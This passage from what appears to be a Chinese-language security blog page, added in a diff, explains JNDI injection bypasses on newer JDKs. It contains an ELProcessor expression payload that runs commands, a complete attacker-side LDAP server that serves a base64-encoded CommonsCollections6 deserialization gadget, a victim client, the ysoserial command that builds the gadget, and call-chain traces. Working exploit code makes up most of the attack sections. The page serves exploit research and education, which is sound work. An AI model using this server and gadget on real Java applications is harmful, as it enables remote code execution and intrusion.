+                }
+            } catch (IntrospectionException var27) {
+                ne = new NamingException(var27.getMessage());
+                ne.setRootCause(var27);
+                throw ne;
+            } catch (IllegalAccessException var28) {
+                ne = new NamingException(var28.getMessage());
+                ne.setRootCause(var28);
+                throw ne;
+            } catch (InstantiationException var29) {
+                ne = new NamingException(var29.getMessage());
+                ne.setRootCause(var29);
+                throw ne;
+            } catch (InvocationTargetException var30) {
+                Throwable cause = var30.getCause();
+                if (cause instanceof ThreadDeath) {
+                    throw (ThreadDeath)cause;
+                } else if (cause instanceof VirtualMachineError) {
+                    throw (VirtualMachineError)cause;
+                } else {
+                    NamingException ne = new NamingException(var30.getMessage());
+                    ne.setRootCause(var30);
+                    throw ne;
+                }
+            }
+        } else {
+            return null;
+        }
+    }
+</code></pre>
+<p><code>method</code>为<code>ELProcessor.eval()</code></p>
+<p><code>Bean</code>为<code>ELProcessor</code></p>
+<p><code>valueArray</code>为<code>&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()&quot;)</code></p>
+<p>也就相当于调用了<code>ELProcessor</code>的<code>eval</code>方法执行了下面的语句</p>
+<p><code>&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd',/c','calc']).start()&quot;)</code></p>
+<h4 id="调用链">调用链</h4>
+<pre><code class="language-java">eval:54, ELProcessor (javax.el)
+---invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+---invoke:62, NativeMethodAccessorImpl (sun.reflect)
+---invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+---invoke:498, Method (java.lang.reflect)
+getObjectInstance:211, BeanFactory (org.apache.naming.factory)
+getObjectInstance:321, NamingManager (javax.naming.spi)
+decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)
+lookup:138, RegistryContext (com.sun.jndi.rmi.registry)
+lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
+lookup:417, InitialContext (javax.naming)
+main:12, client (org.hh.Client)
+</code></pre>
+<h3 id="ldap的绕过"><code>ldap</code>的绕过</h3>
+<p>利用<code>LDAP</code>直接返回一个恶意的序列化对象，<code>JNDI</code>注入依然会对该对象进行反序列化操作，利用反序列化<code>Gadget</code>完成命令执行。</p>
+<h4 id="测试环境-4">测试环境</h4>
+<p><code>jdk8u231</code>，以及需要<code>ldap</code>的依赖和<code>cc</code>链的对应依赖</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;
+         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
+    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+
+    &lt;groupId&gt;org.example&lt;/groupId&gt;
+    &lt;artifactId&gt;anquanke_trx04_ldapbypass&lt;/artifactId&gt;
+    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
+
+    &lt;properties&gt;
+        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;
+        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;
+    &lt;/properties&gt;
+    &lt;dependencies&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;com.unboundid&lt;/groupId&gt;
+            &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;
+            &lt;version&gt;3.1.1&lt;/version&gt;
+        &lt;/dependency&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+            &lt;version&gt;3.2.1&lt;/version&gt;
+        &lt;/dependency&gt;
+
+    &lt;/dependencies&gt;
+
+&lt;/project&gt;
+</code></pre>
+<p><code>CC</code>链生成↓</p>
+<p>搞成<code>base64</code>的可打印字符，方便放入<code>Server</code>端的代码中：</p>
+<pre><code class="language-java">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 &quot;calc&quot; &gt;cc6.txt &amp;&amp;certutil -encode cc6.txt cc6_base64.txt
+</code></pre>
+<h4 id="简述">简述</h4>
+<p>在<code>com.sun.jndi.ldap.LdapCtx#c_lookup</code>方法中判断 <code>javaclassname</code>、<code>javaNamingReference</code>不为空的时候进行<code>decodeObject</code>进行反序列化处理。</p>
+<p>进入到<code>decodeObject</code>，当<code>javaSerializedData</code>不为空的情况，<code>decodeObject</code>会对对应的字段进行反序列化</p>
+<h4 id="server攻击者-4">Server（攻击者）</h4>
+<pre><code class="language-java">package org.hh.Server;
+
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPException;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+import com.unboundid.util.Base64;
+
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+import java.io.Serializable;
+import java.net.InetAddress;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.text.ParseException;
+
+public class Registry_app {
+    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;
+
+    public static void main(String[] argsx) {
+        String[] args = new String[]{&quot;http://1.1.1.1:8/#exp&quot;, &quot;9999&quot;};
+        int port = 0;
+        if (args.length &lt; 1 || args[0].indexOf('#') &lt; 0) {
+            //System.err.println(LdapTest.class.getSimpleName() + &quot; &lt;codebase_url#classname&gt; [&lt;port&gt;]&quot;); //$NON-NLS-1$
+            System.exit(-1);
+        } else if (args.length &gt; 1) {
+            port = Integer.parseInt(args[1]);
+        }
+
+        try {
+            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+            config.setListenerConfigs(new InMemoryListenerConfig(
+                    &quot;listen&quot;,
+                    InetAddress.getByName(&quot;0.0.0.0&quot;),
+                    port,
+                    ServerSocketFactory.getDefault(),
+                    SocketFactory.getDefault(),
+                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
+
+            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0])));
+            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);
+            ds.startListening();
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    private static class OperationInterceptor extends InMemoryOperationInterceptor implements Serializable {
+
+        private URL codebase;
+
+        /**
+         *
+         */
+        public OperationInterceptor(URL cb) {
+            this.codebase = cb;
+        }
+
+        /**
+         * {@inheritDoc}
+         *
+         * @see InMemoryOperationInterceptor#processSearchResult(InMemoryInterceptedSearchResult)
+         */
+        @Override
+        public void processSearchResult(InMemoryInterceptedSearchResult result) {
+            String base = result.getRequest().getBaseDN();
+            Entry e = new Entry(base);
+            try {
+                sendResult(result, base, e);
+            } catch (Exception e1) {
+                e1.printStackTrace();
+            }
+
+        }
+
+        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException, ParseException {
+
+            e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);
+
+           
+            e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQABGNhbGN0AARleGVjdXEAfgAyAAAAAXEAfgA3c3EAfgAnc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4&quot;));
+            //通过Reference远程加载的方式
+//            String cbstring = this.codebase.toString();
+//            int refPos = cbstring.indexOf('#');
+//            if (refPos &gt; 0) {
+//                cbstring = cbstring.substring(0, refPos);
+//            }
+//            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);
+//            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;); //$NON-NLS-1$
+//            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());
+
+            result.sendSearchEntry(e);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        }
+
+    }
+}
+
+</code></pre>
+<h4 id="client受害者-4">Client(受害者)</h4>
+<pre><code class="language-java">package org.hh.Client;
+
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+
+public class Client_lookup {
+    public static void main(String[] args) throws NamingException {
+        String jndiName = &quot;ldap://127.0.0.1:9999/exp&quot;;
+        Context context = new InitialContext();
+        context.lookup(jndiName);
+    }
+}
+
+</code></pre>
+<h5 id="javaxnaminginitialcontextgeturlordefaultinitctx-4"><code>javax.naming.InitialContext#getURLOrDefaultInitCtx</code></h5>
+<p>参数name是 <code>ldap://127.0.0.1:9999/eee</code></p>
+<pre><code class="language-java">    protected Context getURLOrDefaultInitCtx(String name)
+        throws NamingException {
+        if (NamingManager.hasInitialContextFactoryBuilder()) {
+            return getDefaultInitCtx();
+        }
+        String scheme = getURLScheme(name);
+        if (scheme != null) {
+            Context ctx = NamingManager.getURLContext(scheme, myProps);
+            if (ctx != null) {
+                return ctx;
+            }
+        }
+        return getDefaultInitCtx();
+    }
+</code></pre>
+<p>返回的<code>ctx</code>是一个<code>ldapURLContext</code>类型的对象。</p>
+<h5 id="comsunjndiurlldapldapurlcontextlookup-2"><code>com.sun.jndi.url.ldap.ldapURLContext#lookup</code></h5>
+<p>参数var1是<code>ldap://127.0.0.1:9999/eee</code>。</p>
+<pre><code class="language-java">    public Object lookup(String var1) throws NamingException {
+        if (LdapURL.hasQueryComponents(var1)) {
+            throw new InvalidNameException(var1);
+        } else {
+            return super.lookup(var1);
+        }
+    }
+</code></pre>
+<p>里面会调用<code>com.sun.jndi.toolkit.url.GenericURLContext#lookup</code></p>
+<h5 id="comsunjnditoolkiturlgenericurlcontextlookup-4"><code>com.sun.jndi.toolkit.url.GenericURLContext#lookup</code></h5>
+<p>参数var1是<code>ldap://127.0.0.1:9999/eee</code>。</p>
+<pre><code class="language-java">    public Object lookup(String var1) throws NamingException {
+        ResolveResult var2 = this.getRootURLContext(var1, this.myEnv);
+        Context var3 = (Context)var2.getResolvedObj();
+
+        Object var4;
+        try {
+            var4 = var3.lookup(var2.getRemainingName());
+        } finally {
+            var3.close();
+        }
+
+        return var4;
+    }
+</code></pre>
+<p>方法里面会调用<code>com.sun.jndi.toolkit.ctx#PartialCompositeContext#lookup</code>。</p>
+<h5 id="comsunjnditoolkitctxpartialcompositecontextlookup-2"><code>com.sun.jndi.toolkit.ctx.PartialCompositeContext#lookup</code></h5>
+<p>参数var1是<code>eee</code>，即<code>factoryclassname</code>。</p>
+<pre><code class="language-java">    public Object lookup(Name var1) throws NamingException {
+        PartialCompositeContext var2 = this;
+        Hashtable var3 = this.p_getEnvironment();
+        Continuation var4 = new Continuation(var1, var3);
+        Name var6 = var1;
+
+        Object var5;
+        try {
+            for(var5 = var2.p_lookup(var6, var4); var4.isContinue(); var5 = var2.p_lookup(var6, var4)) {
+                var6 = var4.getRemainingName();
+                var2 = getPCContext(var4);
+            }
+        } catch (CannotProceedException var9) {
+            Context var8 = NamingManager.getContinuationContext(var9);
+            var5 = var8.lookup(var9.getRemainingName());
+        }
+
+        return var5;
+    }
+</code></pre>
+<p><code>var5 = var2.p_lookup(var6, var4); var4.isContinue(); var5 = var2.p_lookup(var6, var4)</code> 这里会调用<code>com.sun.jndi.toolkit.ctx.ComponentContext#p_lookup</code></p>
+<h5 id="comsunjnditoolkitctxcomponentcontextp_lookup-2"><code>com.sun.jndi.toolkit.ctx.ComponentContext#p_lookup</code></h5>
+<p>参数<code>var1</code>是<code>eee</code>，参数<code>var2</code>是<code>eee</code>。</p>
+<pre><code class="language-java">    protected Object p_lookup(Name var1, Continuation var2) throws NamingException {
+        Object var3 = null;
+        HeadTail var4 = this.p_resolveIntermediate(var1, var2);
+        switch(var4.getStatus()) {
+        case 2:
+            var3 = this.c_lookup(var4.getHead(), var2);
+            if (var3 instanceof LinkRef) {
+                var2.setContinue(var3, var4.getHead(), this);
+                var3 = null;
+            }
+            break;
+        case 3:
+            var3 = this.c_lookup_nns(var4.getHead(), var2);
+            if (var3 instanceof LinkRef) {
+                var2.setContinue(var3, var4.getHead(), this);
+                var3 = null;
+            }
+        }
+
+        return var3;
+    }
+</code></pre>
+<pre><code class="language-java">        case 2:
+            var3 = this.c_lookup(var4.getHead(), var2);
+</code></pre>
+<p>这里会调用<code>com.sun.jndi.ldap.LdapCtx#c_lookup</code>。</p>
+<h5 id="comsunjndildapldapctxc_lookup-2"><code>com.sun.jndi.ldap.LdapCtx#c_lookup</code></h5>
+<p>从这里开始和<code>8u191</code>之前的<code>ldap</code>利用链有所区别。</p>
+<p>参数<code>var1</code>是<code>eee</code>，参数<code>var2</code>是<code>eee</code>。反序列化调用<code>payload</code>是在第1个<code>try catch</code>里面。</p>
+<pre><code class="language-java">    protected Object c_lookup(Name var1, Continuation var2) throws NamingException {
+        var2.setError(this, var1);
+        Object var3 = null;
+
+        Object var4;
+        try {
+            SearchControls var22 = new SearchControls();
+            var22.setSearchScope(0);
+            var22.setReturningAttributes((String[])null);
+            var22.setReturningObjFlag(true);
+            LdapResult var23 = this.doSearchOnce(var1, &quot;(objectClass=*)&quot;, var22, true);
+            this.respCtls = var23.resControls;
+            if (var23.status != 0) {
+                this.processReturnCode(var23, var1);
+            }
+
+            if (var23.entries != null &amp;&amp; var23.entries.size() == 1) {
+                LdapEntry var25 = (LdapEntry)var23.entries.elementAt(0);
+                var4 = var25.attributes;
+                Vector var8 = var25.respCtls;
+                if (var8 != null) {
+                    appendVector(this.respCtls, var8);
+                }
+            } else {
+                var4 = new BasicAttributes(true);
+            }
+
+            if (((Attributes)var4).get(Obj.JAVA_ATTRIBUTES[2]) != null) {
+                var3 = Obj.decodeObject((Attributes)var4);
+            }
+
+            if (var3 == null) {
+                var3 = new LdapCtx(this, this.fullyQualifiedName(var1));
+            }
+        } catch (LdapReferralException var20) {
+            LdapReferralException var5 = var20;
+            if (this.handleReferrals == 2) {
+                throw var2.fillInException(var20);
+            }
+
+            while(true) {
+                LdapReferralContext var6 = (LdapReferralContext)var5.getReferralContext(this.envprops, this.bindCtls);
+
+                try {
+                    Object var7 = var6.lookup(var1);
+                    return var7;
+                } catch (LdapReferralException var18) {
+                    var5 = var18;
+                } finally {
+                    var6.close();
+                }
+            }
+        } catch (NamingException var21) {
+            throw var2.fillInException(var21);
+        }
+
+        try {
+            return DirectoryManager.getObjectInstance(var3, var1, this, this.envprops, (Attributes)var4);
+        } catch (NamingException var16) {
+            throw var2.fillInException(var16);
+        } catch (Exception var17) {
+            NamingException var24 = new NamingException(&quot;problem generating object using object factory&quot;);
+            var24.setRootCause(var17);
+            throw var2.fillInException(var24);
+        }
+    }
+</code></pre>
+<p>这里的条件在Server端构造里已满足，<code>Obj.JAVA_ATTRIBUTES[2]</code>是<code>javaClassName</code>。</p>
+<pre><code class="language-java">           if (((Attributes)var4).get(Obj.JAVA_ATTRIBUTES[2]) != null) {
+                var3 = Obj.decodeObject((Attributes)var4);
+            }
+</code></pre>
+<p><code>javaClassName</code>是在<code>SendResult</code>里设置成了一个值，这里为<code>foo</code>：</p>
+<pre><code class="language-java">e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);
+</code></pre>
+<p>条件满足，接下来会调用<code>com.sun.jndi.ldap.Obj#decodeObject</code>。</p>
+<h5 id="comsunjndildapobjdecodeobject"><code>com.sun.jndi.ldap.Obj#decodeObject</code></h5>
+<pre><code class="language-java">    static Object decodeObject(Attributes var0) throws NamingException {
+        String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[4]));
+
+        try {
+            Attribute var1;
+            if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {
+                ClassLoader var3 = helper.getURLClassLoader(var2);
+                return deserializeObject((byte[])((byte[])var1.get()), var3);
+            } else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) {
+                return decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), (String)var1.get(), var2);
+            } else {
+                var1 = var0.get(JAVA_ATTRIBUTES[0]);
+                return var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) &amp;&amp; !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2);
+            }
+        } catch (IOException var5) {
+            NamingException var4 = new NamingException();
+            var4.setRootCause(var5);
+            throw var4;
+        }
+    }
+</code></pre>
+<pre><code class="language-java"> if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {
+                ClassLoader var3 = helper.getURLClassLoader(var2);
+                return deserializeObject((byte[])((byte[])var1.get()), var3);
+            }
+</code></pre>
+<p><code>var0.get(JAVA_ATTRIBUTES[1])</code>在<code>Server</code>端已经构造好了对应的<code>Serializeddata</code>，这里接着会调用<code>deserializeObject</code>反序列化。</p>
+<h5 id="comsunjndildapobjdeserializeobject"><code>com.sun.jndi.ldap.Obj#deserializeObject</code></h5>
+<p>参数<code>var0</code>是反序列化命令执行的字节数组，<code>var1</code>是<code>AppClassLoader</code>。</p>
+<pre><code class="language-java">    private static Object deserializeObject(byte[] var0, ClassLoader var1) throws NamingException {
+        try {
+            ByteArrayInputStream var2 = new ByteArrayInputStream(var0);
+
+            try {
+                Object var20 = var1 == null ? new ObjectInputStream(var2) : new Obj.LoaderInputStream(var2, var1);
+                Throwable var21 = null;
+
+                Object var5;
+                try {
+                    var5 = ((ObjectInputStream)var20).readObject();
+                } catch (Throwable var16) {
+                    var21 = var16;
+                    throw var16;
+                } finally {
+                    if (var20 != null) {
+                        if (var21 != null) {
+                            try {
+                                ((ObjectInputStream)var20).close();
+                            } catch (Throwable var15) {
+                                var21.addSuppressed(var15);
+                            }
+                        } else {
+                            ((ObjectInputStream)var20).close();
+                        }
+                    }
+
+                }
+
+                return var5;
+            } catch (ClassNotFoundException var18) {
+                NamingException var4 = new NamingException();
+                var4.setRootCause(var18);
+                throw var4;
+            }
+        } catch (IOException var19) {
+            NamingException var3 = new NamingException();
+            var3.setRootCause(var19);
+            throw var3;
+        }
+    }
+</code></pre>
+<p>执行到这里就反序列化。</p>
+<h4 id="调用链-2">调用链</h4>
+<pre><code class="language-java">deserializeObject:xxx, Obj (com.sun.jndi.ldap)
+decodeObject:xxx, Obj (com.sun.jndi.ldap)
+c_lookup:1051, LdapCtx (com.sun.jndi.ldap)
+p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
+lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
+lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
+lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
+lookup:417, InitialContext (javax.naming)
+main:12, client (org.hh.Client)
+
+</code></pre>
+<h2 id="misc"><code>misc</code></h2>
+<p>四种打法：</p>
+<p>https://xz.aliyun.com/t/7079?accounttraceid=4167b7d3ec9a4fd08f7493589225b656koni#toc-3</p>
+<ol>
+<li>打<code>Registry</code>注册中心</li>
+</ol>
+<p>通过使用Registry连接到注册中心，然后把gadget chain对象bind注册到注册中心，从而引起注册中心反序列化RCE</p>
+<ol start="2">
+<li>打<code>InitialContext.lookup</code>执行者</li>
+</ol>
+<p>通过使用<code>JNDI</code>的实现，也就是<code>rmi</code>或<code>ldap</code>的目录系统服务，在其中放置一个某名称关联的<code>Reference</code>，<code>Reference</code>关联<code>http</code>服务中的恶意<code>class</code>，在某程序<code>InitialContext.lookup</code>目录系统服务后，返回<code>Reference</code>给该程序，使其加载远程<code>class</code>，从而<code>RCE</code></p>
+<ol start="3">
+<li><code>JRMP</code>协议客户端打服务端</li>
+</ol>
+<p>使用<code>JRMP</code>协议，直接发送<code>gadget chain</code>的序列化数据到服务端，从而引起服务端反序列化<code>RCE</code></p>
+<ol start="4">
+<li><code>JRMP</code>协议服务端打客户端</li>
+</ol>
+<p>使用<code>JRMP</code>协议，当客户端连上后，直接返回<code>gadget chain</code>的序列化数据给客户端，从而引起客户端反序列化<code>RCE</code></p>
+<p>一些不错的链接</p>
+<p>https://blog.csdn.net/mole_exp/article/details/121141042</p>
+<p>https://y4er.com/posts/use-local-factory-bypass-jdk-to-jndi/#%E7%BB%95%E8%BF%87</p>
+<p>https://paper.seebug.org/942/#ldapgadget</p>
+<p>https://github.com/kxcode/JNDI-Exploit-Bypass-Demo</p>
+<p>https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</p>
+<p>https://paper.seebug.org/1766/</p>
+<p>https://www.freebuf.com/articles/web/341093.html</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#jndirmildap"><code>JNDI&amp;RMI&amp;LDAP</code></a>
+<ul>
+<li><a href="#rmi"><code>RMI</code></a>
+<ul>
+<li><a href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4">适用范围</a></li>
+<li><a href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83">测试环境</a></li>
+<li><a href="#%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81">恶意代码</a></li>
+<li><a href="#server%E6%94%BB%E5%87%BB%E8%80%85"><code>Server</code>（攻击者）</a></li>
+<li><a href="#client%E5%8F%97%E5%AE%B3%E8%80%85"><code>Client</code>（受害者）</a>
+<ul>
+<li><a href="#javaxnaminginitialcontextgeturlordefaultinitctx"><code>javax.naming.InitialContext#getURLOrDefaultInitCtx</code></a></li>
+<li><a href="#comsunjnditoolkiturlgenericurlcontextlookup"><code>com.sun.jndi.toolkit.url.GenericURLContext#lookup</code></a></li>
+<li><a href="#comsunjndirmiregistryregistrycontextlookup"><code>com.sun.jndi.rmi.registry.RegistryContext#lookup</code></a></li>
+<li><a href="#comsunjndirmiregistryregistrycontextdecodeobject"><code>com.sun.jndi.rmi.registry.RegistryContext#decodeObject</code></a></li>
+<li><a href="#javaxnamingspinamingmanagergetobjectinstance"><code>javax.naming.spi.NamingManager#getObjectInstance</code></a></li>
+<li><a href="#javaxnamingspinamingmanagergetobjectfactoryfromreference"><code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code></a></li>
+<li><a href="#%E8%B0%83%E7%94%A8%E6%A0%88">调用栈</a></li>
+</ul>
+</li>
+<li><a href="#jdk8u121"><code>jdk8u121</code></a></li>
+</ul>
+</li>
+<li><a href="#ldap"><code>LDAP</code></a>
+<ul>
+<li><a href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-2">适用范围</a></li>
+<li><a href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83-2">测试环境</a></li>
+<li><a href="#%E7%AE%80%E4%BB%8B">简介</a></li>
+<li><a href="#maven%E4%BE%9D%E8%B5%96"><code>maven</code>依赖</a></li>
+<li><a href="#%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81-2">恶意代码</a></li>
+<li><a href="#server%E6%94%BB%E5%87%BB%E8%80%85-2"><code>Server</code>（攻击者）</a></li>
+<li><a href="#client%E5%8F%97%E5%AE%B3%E8%80%85-2"><code>Client</code>（受害者）</a>
+<ul>
+<li><a href="#javaxnaminginitialcontextgeturlordefaultinitctx-2"><code>javax.naming.InitialContext#getURLOrDefaultInitCtx</code></a></li>
+<li><a href="#comsunjndiurlldapldapurlcontextlookup"><code>com.sun.jndi.url.ldap.ldapURLContext#lookup</code></a></li>
+<li><a href="#comsunjnditoolkiturlgenericurlcontextlookup-2"><code>com.sun.jndi.toolkit.url.GenericURLContext#lookup</code></a></li>
+<li><a href="#comsunjnditoolkitctxpartialcompositecontextlookup"><code>com.sun.jndi.toolkit.ctx.PartialCompositeContext#lookup</code></a></li>
+<li><a href="#comsunjnditoolkitctxcomponentcontextp_lookup"><code>com.sun.jndi.toolkit.ctx.ComponentContext#p_lookup</code></a></li>
+<li><a href="#comsunjndildapldapctxc_lookup"><code>com.sun.jndi.ldap.LdapCtx#c_lookup</code></a></li>
+<li><a href="#javaxnamingspidirectorymanagergetobjectinstance"><code>javax.naming.spi.DirectoryManager#getObjectInstance</code></a></li>
